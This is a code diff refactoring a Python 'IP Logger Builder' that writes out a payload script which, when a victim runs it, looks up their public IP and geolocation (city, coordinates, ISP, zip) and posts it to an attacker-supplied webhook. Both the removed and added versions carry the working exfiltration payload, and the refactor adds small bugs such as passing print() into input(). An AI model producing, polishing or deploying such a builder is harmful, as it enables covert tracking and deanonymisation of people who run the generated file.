@@ -1,70 +1,64 @@
-try:
-    import os
-    from os import system
-    system("title " + "Ip Logger Builder, made by Nimp#2022, My github - https://github.com/NimpReal")
-except:
-    pass
-try:
-    import os
-except Exception:
-    pass
+import os
+import sys
+
 try:
     import requests
 except Exception:
     while True:
-        e = input("Requests Module Missing, Wanna Try Auto Fix It (y/n): ")
+        e = input("Requests Module Missing, Wanna Try Auto-Fix It (y/n): ")
         if e == "y" or e == "n":
             break
-        else:
-            print("Enter A Valid Choice")
+        print("Enter A Valid Choice")
+
     if e == "n":
-        exit()
-    if e == "y":
-        try:
-            os.system("pip install requests")
-            print("It Shod Be Fixed Now, Press Enter To Start Main Program")
-            input("")
-        except Exception:
-            print("Error Fixing, Press Enter To Close Program")
-            input("")
-            exit()
+        sys.exit()
+
+    try:
+        os.system("pip install requests")
+        input(print("It Should Be Fixed Now, Press Enter To Start Main Program"))
+    except Exception:
+        input(print("Error Fixing, Press Enter To Close Program"))
+        sys.exit()
+
+os.system(
+    "title "
+    + "IP Logger Builder - Made by Nimp#2022 - Github: https://github.com/NimpReal"
+)
+
 while True:
     name = input("Name of the logger: ")
-    temp = len(name)
-    if int(temp) > 135:
-        print("To Long Name")
-    if int(temp) < 135:
-        break
+    if len(name) > 135:
+        print("Name Too Long")
+        continue
+    break
+
 code = """import requests
 url = "https://api.ipify.org"
 r = requests.get(url).text
-r = str(r)
 requests.post(webhook, json={"content": f"@everyone ```Ip: {r}```"})
 r2 = requests.get(f"http://ip-api.com/json/{r}").json()
 """
 code2 = 'info = "Country: " + r2["country"] + "\n" +  "Country Code: " + r2["countryCode"] + "\n" + "Region Name: " + r2["regionName"] + "\n" + "City: " + r2["city"] + "\n" + "Zip Code: " + r2["zip"] + "\n" + "Lat: " + str(r2["lat"]) + "\n" + "Lon: " + str(r2["lon"]) + "\n" + "Timezone: " + r2["timezone"] + "\n" + "ISP: " + r2["isp"] + "\n" + "Org: " + r2["org"] + "\n" + "AS: " + r2["as"]'
 code3 = 'requests.post(webhook, json={"content": f"```Ip Info: {info}```"})'
+
 while True:
     try:
         webhook = input("Enter Your Webhook: ")
         r = requests.get(webhook)
-        if "200" in str(r):
-            break
-        if "200" not in str(r):
-            print("Webhook Invalid")
+        if 200 != r.status_code:
+            print("Invalid Webhook")
+            continue
     except Exception:
         print("Webhook Invalid")
+        continue
+    break
+
 try:
-    file = open(f"{name}.py", "a")
-    file.write(f'webhook = "{webhook}"\n')
-    file.write(code)
-    file.write(repr(code2)[1:-1]+"\n")
-    file.write(code3)
-    file.close()
+    with open(f"{name}.py", "a") as file:
+        file.write(f'webhook = "{webhook}"\n')
+        file.write(code + repr(code2)[1:-1] + "\n" + code3)
 except:
-    print("Unkown Error")
-    input("")
-    exit()
-print("Succsesfully Made File")
-input("")
-exit()
+    input(print("Unknown Error"))
+    sys.exit()
+
+input(print("Succsesfully Made File"))
